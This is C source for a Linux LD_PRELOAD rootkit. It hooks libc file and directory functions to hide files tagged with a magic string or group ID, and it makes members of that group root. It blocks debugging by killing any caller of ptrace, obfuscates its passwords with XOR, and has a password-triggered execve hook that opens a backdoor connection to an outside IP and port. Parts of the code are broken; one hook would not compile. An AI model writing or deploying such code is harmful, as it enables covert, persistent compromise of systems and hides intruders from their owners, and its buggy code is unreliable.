#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <strings.h>
#include <string.h> 
#include <dlfcn.h> 
#include <fcntl.h>
#include <errno.h> 
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <errno.h> 
#include <netinet/in.h> 
#include <dirent.h>
#include <limits.h> 
#include "utils/clean.h"
#include "utils/catflap.h"
#include "rkconst.h"


#define DEBUG
#define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)
#define CLEAN(var) clean(var, strlen(var))
#define MAGIC "\x43\x47\x4d\x4b\x53" //imgay
#define PROC "\x5\x5a\x58\x45\x49"
#define MAGICGID 1337
#define EXECPW "\x43\x44\x59\x5e\x4b\x46\x46\x4d\x4f\x44\x5e\x45\x45" 
//installgen$
#define SHELLPW "\x48\x46\x1b\x44\x4d" //bl1ng
#define DEFAULT_PORT    61040
#define IP              "1.3.3.7"


//function pointers to hooked functions

//misc
int (*old_execve)(const char *path, char *const argv[], char *const envp[]); 
int (*old_chmod)(const char *pathname, mode_t mode); 
char *(*old_fgets)(char *s, int size, FILE *stream);
long int (*old_ptrace)(enum __ptrace_request request, ...);

//directory functions
struct dirent *(*old_readdir)(DIR *dirp);
struct dirent64 *(*old_readdir64)(DIR *dirp); 
int (*old_chdir)(const char *path); 
int (*old_mkdir)(const char *pathname, mode_t mode); 
int (*old_mkdirat)(int dirfd, const char *pathname, mode_t mode);
int (*old_rmdir)(const char *pathname); 
DIR *(*old_opendir)(const char *name); 
DIR *(*old_fdopendir)(int fd);

//file linking functions 
int (*old_link)(const char *oldpath, const char *newpath); 
int (*old_unlink)(const char *path);
int (*old_unlinkat)(int dirfd, const char *pathname, int flags); 
int (*old_symlink)(const char *path1, const char *path2); 

//file opening functions 
int (*old_access)(const char *path, int amode); 
int (*old_open)(const char *file, int oflag, ...);
int (*old_faccessat)(int fd, const char *path, int amode, int flag); 
FILE *(*old_fopen)(const char *pathname, const char *mode); 

//file naming functions 
int (*old_rename)(const char *oldpath, const char *newpath);
int (*old_renameat)(int olddirfd, const char *oldpath, int newdirfd, const char *newpath);

//stat functions
int (*old_stat)(const char *path, struct stat *buf);
int (*old_stat64)(const char *path, struct stat64 *buf);
int (*old___xstat)(int ver, const char *path, struct stat *buf); 
int (*old_fstat)(int fildes, struct stat *buf); 
int (*old_fstatat)(int fd, const char *restrict path, struct stat *restrict buf, int flag); 
int (*old_lstat)(const char *restrict path, struct stat *restrict buf);

void xor(char *s)
{
       int i, key = 0x2A;
       for(i=0; i<strlen(s); i++) s[i] ^= key;
}        

int owned(void)
{ 
	int x;
	
	if ((getuid() == 0) || getgid() == MAGICGID)
	{
		setuid(0); 
		x = 1; 
	} 
	else
		x = 0; 
	return x; 
} 

long int ptrace(enum __ptrace_request request, ...)
{
	HOOK(ptrace);
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] ptrace hooked\n"); 
	#endif 	
	printf("bl1ng bl1ng\n"); 
	exit(-1);
}

int execve(const char *path, char *const argv[], char *const envp[])
{
	HOOK(execve);
	#ifdef DEBUG 
	printf("[!] execve hooked"); 
	#endif
	
	if (owned())
	{
		if (argv[1] != NULL)
		{ 
			char *execpw = strdup(EXECPW); xor(execpw); 
			if (!strcmp(argv[1],  execpw))
			{	
				if (!strcmp(argv[2], "catflap"))
				{ 
					printf("opening catflap\n");
				        catflap(IP, DEFAULT_PORT);
				}
			} 
//			CLEAN(execpw);
			return old_execve(path, argv, envp);
		}
	       	return old_execve(path, argv, envp);	
	} 
	return old_execve(path, argv, envp); 
} 

int stat(const char *path, struct stat *buf)
{
	HOOK(stat);
	#ifdef DEBUG
	printf("[!] stat hooked"); 
	#endif

	char *magic = strdup(MAGIC); xor(magic); 
       	struct stat filestat; 
	old_stat(path, &filestat); 
	if (owned()) return old_stat(path, buf); 
	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
	{
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic); 
	return old_stat(path, buf);	
}

int stat64(const char *path, struct stat64 *buf)
{ 
	HOOK(stat64);
	#ifdef DEBUG
	printf("[!] stat64 hooked"); 
	#endif	
	
	char *magic = strdup(MAGIC); xor(magic);
	struct stat64 filestat; 
	old_stat64(path, &filestat); 
	if (owned()) return old_stat64(path, buf); 
	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
	{
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old_stat64(path, buf); 
}

int __xstat(int ver, const char *path, struct stat *buf)
{ 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] __xstat hooked\n"); 
	#endif	
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat;
       	old___xstat(ver, path, &filestat);	
	#ifdef DEBUG
	printf("file: %s\n", path); 
	printf("gid: %d\n", filestat.st_gid);
	#endif
	if (strstr(path, magic) || filestat.st_gid == MAGICGID )
	{
		errno = ENOENT; 
		return -1; 
	}
	return old___xstat(ver, path, buf); 
} 

int lstat(const char *pathname, struct stat *buf)
{ 
	HOOK(lstat); 
	#ifdef DEBUG 
	printf("[!] lstat hooked"); 
	#endif
	struct stat filestat; 
	char *magic = strdup(MAGIC); xor(magic); 
	if (owned()) return old_lstat(pathname, buf); 
	old_lstat(pathname, &filestat); 
	if ((strstr(pathname, magic)) || (filestat.st_gid == MAGICGID))
	{
		errno = ENOENT; 
		return -1; 
	}
	return old_lstat(pathname, buf); 
}
int fstat(int fildes, struct stat *buf) 
{ 
	HOOK(fstat); 
	#ifdef DEBUG 
	printf("[!] fstat hooked\n"); 
	#endif
	struct stat filestat; 
	char *magic = strdup(MAGIC); xor(magic); 
	if (owned()) return old_fstat(fildes, buf); 
	old_fstat(fildes, &filestat);	
	if (filestat.st_gid == MAGICGID)
	{
		errno = ENOENT; 
		return -1; 
	}
	return old_fstat(fildes, buf);
}

int link(const char *oldpath, const char *newpath)
{ 
	HOOK(link); 
	HOOK(__xstat);
	#ifdef DEBUG
       	printf("[!] link hooked\n"); 
	#endif	
	
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat;
	old___xstat(_STAT_VER, oldpath, &filestat);
	if (owned()) return old_link(oldpath, newpath); 
	if ((strstr(oldpath, magic)) || (strstr(newpath, magic)) || filestat.st_gid == MAGICGID)
	{
		errno = ENOENT; 
		return -1; 
	}
	return old_link(oldpath, newpath); 
}	
int unlink(const char *path)
{
	HOOK(unlink);
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] unlink hooked");
	#endif
	
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat);
       	if (owned()) return old_unlink(path); 
	if ((strstr(path, magic)) || (filestat.st_gid == MAGICGID))
	{
		errno = ENOENT; 
		return -1; 
	}
	return old_unlink(path); 
}

int unlinkat(int dirfd, const char *path, int flags)
{
	HOOK(unlinkat); 
	HOOK(__xstat);
	#ifdef DEBUG
	printf("[!] unlinkat hooked\n"); 
	#endif 
	
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat); 
	if (owned()) return old_unlinkat(dirfd, path, flags); 
	if ((strstr(path, magic) || (filestat.st_gid == MAGICGID)))
	{
		errno = ENOENT; 
		return -1; 
	}
	return old_unlinkat(dirfd, path, flags); 
}

int symlink(const char *path1, const char *path2)
{ 
	HOOK(symlink);
	#ifdef DEBUG 
	printf("[!] symlink hooked");
	#endif
	
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat1, filestat2; 
	HOOK(__xstat);
	old___xstat(_STAT_VER, path1, &filestat1); 
	old___xstat(_STAT_VER, path2, &filestat2); 
	if (owned()) return old_symlink(path1, path2);
	if (strstr(path1, MAGIC) || strstr(path2, MAGIC) || (filestat1.st_gid == MAGICGID) || (filestat2.st_gid == MAGICGID))
	{
		errno = ENOENT; 
	 	return -1;
	}
	CLEAN(magic);	
	return old_symlink(path1, path2); 
}
int rename(const char *oldpath, const char *newpath)
{
	HOOK(rename);
	#ifdef DEBUG
	printf("[!] rename hooked");
	#endif
	if (owned())
	{
		char *magic = strdup(MAGIC); xor(magic);
		if (strstr(oldpath, magic))
		{
			errno = ENOENT; 
			return -1; 
		}
		CLEAN(magic);
		return old_rename(oldpath, newpath);
	}
	return old_rename(oldpath, newpath);
}

int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath)
{ 
	HOOK(renameat); 
	#ifdef DEBUG
	printf("[!] renameat hooked"); 
	#endif
	if (owned())
	{ 
		char *magic = strdup(MAGIC); xor(magic);
		if (strstr(oldpath, magic))
		{
			errno = ENOENT; 
			return -1; 
		}
		CLEAN(magic);
		return old_renameat(olddirfd, oldpath, newdirfd, newpath);
	}
	return old_renameat(olddirfd, oldpath, newdirfd, newpath);
}


/*
   _                       
  (_)_ _    ___ ____ ___ __
 / /  ' \  / _ `/ _ `/ // /
/_/_/_/_/  \_, /\_,_/\_, / 
          /___/     /___/
*/ 
struct dirent *readdir(DIR *dirp)
{ 
	HOOK(readdir);
	#ifdef DEBUG 
	printf("[!] readdir hooked\n"); 
	#endif
	// this hook made me suicidal 
	char *magic = strdup(MAGIC); xor(magic); 
	char path[PATH_MAX + 1];
	struct dirent *dir; 
	struct stat filestat; 	
	if (owned()) return old_readdir(dirp); 
	do
	{ 
		dir = old_readdir(dirp); 
		if (dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, "/\0") == 0))
			continue; 
		if (dir != NULL)
		{ 
			int fd; 
			char fdpath[256], *dirname = (char *) malloc(sizeof(fdpath)); 
			memset(dirname, 0x0, sizeof(fdpath)); 
			fd = dirfd(dirp); 
			snprintf(fdpath, sizeof(fdpath) - 1, "/proc/self/fd/%d", fd); 
			readlink(fdpath, dirname, sizeof(fdpath) - 1); 
			snprintf(path, PATH_MAX, "%s/%s", dirname, dir->d_name); 
			old___xstat(_STAT_VER, path, &filestat); 
		}
	}while (dir && (filestat.st_gid == MAGICGID)); 
	CLEAN(magic); 	
	return dir;	
} 

int chdir(const char *path)
{ 
	HOOK(chdir);
	#ifdef DEBUG
	printf("[!] chdir hooked"); 
	#endif

	char *magic = strdup(MAGIC); xor(magic);
       	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat);	
	if (owned()) return old_chdir(path);
	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
	{
		errno = ENOENT; 
		return -1; 
	}
	return old_chdir(path);
} 

int mkdir(const char *pathname, mode_t mode)
{ 
	HOOK(mkdir);
	#ifdef DEBUG
	printf("[!] mkdir hooked\n"); 
	#endif 
	
	if (owned()) return old_mkdir(pathname, mode);
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic)) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	}
	return old_mkdir(pathname, mode);
} 

int mkdirat(int dirfd, const char *pathname, mode_t mode)
{ 
	HOOK(mkdirat); 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] mkdirat hooked"); 
	#endif

	if (owned()) return old_mkdirat(int dirfd, const char *pathname, mode_t mode);
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, filestat); 
	if ((strstr(pathname, magic)) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT;
		return -1; 
	}
	CLEAN(magic);
	return old_mkdirat(dirfd, pathname, mode); 
}
	
int rmdir(const char *pathname)
{ 
	HOOK(rmdir); 
	HOOK(__xstat); 
	#ifdef DEBUG 
	printf("[!] rmdir hooked");
	#endif 

	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat;
	old___xstat(_STAT_VER, pathname, &filestat);	
	if (owned()) return old_rmdir(pathname); 
	if ((filestat.st_gid == MAGICGID) || strstr(pathname, magic))
	{
		errno = ENOENT; 
		return -1;
	}
	return old_rmdir(pathname); 
}

DIR *opendir(const char *name)
{ 
	HOOK(opendir); 
	#ifdef DEBUG 
      	printf("[!] opendir hooked\n"); 
	#endif
	
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	HOOK(__xstat);
	old___xstat(_STAT_VER, name, &filestat);
	if (owned()) return old_opendir(name); 
	if ((strstr(name, magic)) || filestat.st_gid == MAGICGID)
	{
		errno = ENOENT; 
		return NULL; 
	}
	CLEAN(magic);
	return old_opendir(name); 
} 

int open(const char *file, int oflag, ...)
{ 
	HOOK(open); 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] open hooked\n"); 
	#endif 
	
	if (owned()) return old_open(file, oflag); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, file, &filestat); 
	if ((strstr(file, magic)) || filestat.st_gid == MAGICGID)
	{ 
		errno = ENOENT; 
		return -1; 
	}
	return old_open(file, oflag);
}

int access(const char *pathname, int mode)
{ 
	HOOK(access); 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] access hooked\n"); 
	#endif

	if (owned()) return old_access(pathname, mode); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic)) || filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	return old_access(pathname, mode);
}
FILE *fopen(const char *pathname, const char *mode)
{ 
	HOOK(fopen); 
	#ifdef DEBUG 
	printf("[!] fopen hooked"); 
	#endif 

	if (owned()) return old_fopen(pathname, mode);
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic)) || filestat.st_gid == MAGICGID)
	{
		CLEAN(magic);
		errno = ENOENT;
		return NULL;
	}
	return old_fopen(pathname, mode);
}	

char *fgets(char *s, int size, FILE *stream)
{ 

	char *p;
	struct stat filestat;
	HOOK(fgets); 
	p = old_fgets(s, size, stream);
	if (p == NULL)
		return(p);
	if (owned())
		return old_fgets(s, size, stream);
	if (old_access(s, F_OK) != -1) // is s a file or directory? 
	{ 
		old___xstat(_STAT_VER, s, &filestat); 
		char *magic = strdup(MAGIC); xor(magic);
		if (filestat.st_gid == MAGICGID)
		{ 
			return NULL; // s is owned by magic; return null
			CLEAN(magic);
			CLEAN(p);
		}
		else
		{
			return p; // continue
			CLEAN(magic);
			CLEAN(p); 	
		}	
	}
	return p;
}		

int chmod(const char *path, mode_t mode) 
{ 
	HOOK(chmod);
	#ifdef DEBUG 
	printf("[!] chmod hooked");
	#endif
	
	struct stat filestat; 
	HOOK(__xstat);	
	old___xstat(_STAT_VER, path, &filestat);	
        if (owned()) return old_chmod(path, mode); 	
	char *magic = strdup(MAGIC); xor(magic);
	if ((strstr(path, magic)) || filestat.st_gid == MAGICGID)
	{
		errno = ENOENT; 
		return -1;
	}
	return old_chmod(path, mode);
}


